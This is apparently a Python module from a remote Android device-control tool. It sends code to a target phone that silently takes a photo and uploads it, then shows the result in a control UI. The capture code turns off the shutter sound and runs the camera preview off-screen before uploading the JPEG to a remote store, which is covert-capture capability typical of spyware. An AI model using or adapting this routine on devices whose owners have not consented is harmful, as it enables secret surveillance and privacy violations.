"""In-memory remote camera feature. Replaceable at runtime."""

import json
import client_service

FEATURE = {"name": "camera", "title": "Camera", "version": 1, "actions": ["capture"],
           "ui": "python", "icon": "camera"}


def run():
    return FEATURE


def build_photo_code(facing=0):
    return f'''import json, sys, time
from android.hardware import Camera
from android.graphics import SurfaceTexture
from java import dynamic_proxy
import aliyun_git

# 同一接口重复 dynamic_proxy 建类会让回调崩 _chaquopyGetType is abstract，
# 本服务进程可能多次执行本代码，类只建一次并挂在 sys 上复用。
if not hasattr(sys, "_qgb_photo_cb_cls"):
    class PhotoCallback(dynamic_proxy(Camera.PictureCallback)):
        def __init__(self):
            super().__init__()
            self.data = None
        def onPictureTaken(self, data, camera):
            if data is not None:
                self.data = bytes(data)
    sys._qgb_photo_cb_cls = PhotoCallback
PhotoCallback = sys._qgb_photo_cb_cls

camera = None
callback = PhotoCallback()
try:
    for _ in range(3):
        try:
            camera = Camera.open({int(facing)})
            break
        except Exception:
            time.sleep(0.5)
    if camera is None:
        raise RuntimeError("camera open failed")
    try:
        camera.enableShutterSound(False)
    except Exception:
        pass
    camera.setPreviewTexture(SurfaceTexture(10))
    camera.startPreview()
    time.sleep(1.0)
    camera.takePicture(None, None, callback)
    started = time.time()
    while callback.data is None and time.time() - started < 8:
        time.sleep(0.1)
    if callback.data is None:
        raise TimeoutError("camera capture timeout")
    url = aliyun_git.upload(callback.data, file_path="photo_" + str(int(time.time() * 1000)) + ".jpg")
    r = json.dumps({{"ok": True, "url": url, "size": len(callback.data), "facing": {int(facing)}}}, ensure_ascii=False)
except Exception as exc:
    r = json.dumps({{"ok": False, "error": repr(exc)}}, ensure_ascii=False)
finally:
    if camera is not None:
        try: camera.stopPreview()
        except Exception: pass
        try: camera.release()
        except Exception: pass
'''


def capture(facing=0):
    # 拍照 + JPEG 经 OpenAPI 上传约 5~30s，固定 45s 超时（设备默认值可能更短）。
    result = client_service.rpc(build_photo_code(int(facing)), timeout=45)
    return json.dumps(client_service.parse_json_result(result), ensure_ascii=False)


def build_view(context):
    """Chaquopy 自绘相机页（按目标设备在内存托管状态）。

    - 切 feature tab / 开覆盖页：View 常驻，状态天然不丢；
    - 切到别的目标再回来：states[key] 各自保存 facing/文字/照片，
      由目标切换回调换绑，照片原样还在；
    - JPEG 走 OpenAPI 通道（download_transfer_base64），不经 MQTT。
    """
    import base64
    import bootstrap
    import pyui_kit
    from android.graphics import BitmapFactory
    from android.view import View

    page = pyui_kit.Page(
        context, "Camera", "JPEG stays in memory on the target, transferred outside MQTT."
    )

    # key -> {facing, facing_loaded, status, bitmap}
    states = {}
    current = {"key": None, "topic": None}

    # 照片放最前面（标题之下第一屏就是图）：原生双指缩放/拖动控件，
    # 拿不到原生控件时 pyui_kit 自动回退成不能动的静态图（页面仍完整）。
    image = pyui_kit.make_zoom_image(context, height_dp=300)
    page.add(image, top=8)

    status = pyui_kit.make_text(context, "Ready", selectable=True)
    page.add(status, top=8)

    def new_state():
        return {"facing": 0, "facing_loaded": False, "status": "Ready", "bitmap": None}

    def state_for(key):
        return states.setdefault(key, new_state())

    def back_label():
        st = state_for(current["key"]) if current["key"] else new_state()
        return ("• " if st["facing"] == 0 else "  ") + "Back camera"

    def front_label():
        st = state_for(current["key"]) if current["key"] else new_state()
        return ("• " if st["facing"] == 1 else "  ") + "Front camera"

    back = pyui_kit.make_button(context, "Back camera", lambda: None)
    front = pyui_kit.make_button(context, "Front camera", lambda: None)
    shutter = pyui_kit.make_button(context, "Capture", lambda: None)

    def paint():
        st = state_for(current["key"])
        status.setText(st["status"])
        if st["bitmap"] is not None:
            image.setImageBitmap(st["bitmap"])
            image.setVisibility(View.VISIBLE)
        else:
            image.setVisibility(View.GONE)
        back.setText(back_label())
        front.setText(front_label())

    def select_facing(value):
        key = current["key"]
        if not key:
            return
        st = state_for(key)
        st["facing"] = int(value)
        paint()

        def work():
            client_service.update_feature_settings(
                "camera", json.dumps({"lens_facing": int(value)}), key
            )

        pyui_kit.run_async(work)

    def load_facing(key):
        st = state_for(key)
        if st["facing_loaded"]:
            return
        st["facing_loaded"] = True

        def work():
            raw = client_service.feature_settings("camera", key)
            try:
                value = int(json.loads(raw).get("lens_facing", 0))
            except (TypeError, ValueError):
                value = 0
            return value

        def apply_ok(value):
            st["facing"] = value
            if current["key"] == key:
                paint()

        pyui_kit.run_async(work, apply_ok)

    def on_capture():
        key = current["key"]
        if not key:
            return
        st = state_for(key)
        st["status"] = "Capturing ..."
        st["bitmap"] = None
        paint()
        facing = int(st["facing"])

        def work():
            raw = bootstrap.call_feature("camera", "capture", facing)
            result = json.loads(raw)
            if not result.get("ok"):
                return (pyui_kit.render_result(raw), None)
            url = result.get("url")
            bitmap = None
            if url:
                data = base64.b64decode(client_service.download_transfer_base64(url))
                bitmap = BitmapFactory.decodeByteArray(data, 0, len(data))
            return (pyui_kit.render_result(raw), bitmap)

        def apply_ok(payload):
            st["status"], st["bitmap"] = payload
            paint()

        def apply_error(error):
            st["status"] = "Capture failed: %s" % error
            paint()

        pyui_kit.run_async(work, apply_ok, apply_error, buttons=(shutter,))

    pyui_kit.click(back, lambda: select_facing(0))
    pyui_kit.click(front, lambda: select_facing(1))
    pyui_kit.click(shutter, on_capture)
    page.bottom_add(back)
    page.bottom_add(front)
    page.bottom_add(shutter, weight=1.0)

    def on_target(key, topic, _cfg):
        current["key"] = key
        current["topic"] = topic
        page.set_target("target topic: " + topic)
        state_for(key)
        load_facing(key)
        paint()

    pyui_kit.watch_target(page.root, on_target)
    return page.root
